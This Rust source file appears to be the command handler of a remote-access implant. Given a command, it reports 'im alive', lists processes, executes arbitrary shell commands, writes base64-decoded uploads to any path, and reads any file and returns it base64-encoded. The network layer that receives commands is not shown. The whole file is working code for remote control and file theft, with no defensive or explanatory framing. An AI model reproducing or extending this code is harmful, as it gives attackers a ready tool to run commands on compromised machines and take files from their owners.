use std::process::Command;
use std::io::{Read, Cursor, BufReader};
extern crate base64;
use std::fs::File;
use std::io::Write;

pub fn filter_action(command: &str, data: &str)-> String{

    let result: String = match command {
        "heartbeat" => std::string::String::from("im alive"),
        "ps" => run_ps(),
        "exec" => run_exec(data),
        x if (command.contains("upload")) => run_upload(x, data),
        x if (command.contains("download")) => run_download(x),
        _ => std::string::String::from("no command")
    };
    result
}

fn run_ps() -> String{
    let output: Vec<u8> = Command::new("ps").output().unwrap().stdout;
    let msg: &str = std::str::from_utf8(&output).unwrap();
    std::string::String::from(msg)
}

fn run_exec(data: &str) -> String{
    let args: Vec<&str> = data.split(" ").collect();
    let output: Vec<u8> = Command::new(args[0]).args(&args[1..]).output().unwrap().stdout;
    let msg:&str = std::str::from_utf8(&output).unwrap();
    std::string::String::from(msg)
}
fn run_upload(command: &str, data: &str) -> String{
    let args: Vec<&str> = command.split(" ").collect();
    let name: Vec<&str> = args[1].split(":").collect();
    let destination: Vec<&str> = args[2].split(":").collect();
    println!("{:?}", name[1]);
    println!("{:?}", destination[1]);
    let mut wrapped_reader = Cursor::new(data);
    let mut decoder = base64::read::DecoderReader::new(
        &mut wrapped_reader, base64::STANDARD);
    let mut result: Vec<u8> = Vec::new();
    decoder.read_to_end(&mut result).unwrap();
    let mut file: File = File::create(destination[1]).unwrap();
    file.write_all(&result).unwrap();
    std::string::String::from("upload")
}

fn run_download(command: &str) -> String {
    let args: Vec<&str> = command.split(" ").collect();
    let name: Vec<&str> = args[1].split(":").collect();
    let file: File = File::open(&name[1]).unwrap();
    let mut reader = BufReader::new(file);
    let mut buffer: Vec<u8> = Vec::new();
    reader.read_to_end(&mut buffer).unwrap();
    let mut enc = base64::write::EncoderWriter::new(Vec::new(), base64::STANDARD);
    enc.write_all(&buffer).unwrap();
    let out: Vec<u8> = enc.finish().unwrap();
    let data: &str = std::str::from_utf8(&out).unwrap();
    std::string::String::from(data)

}

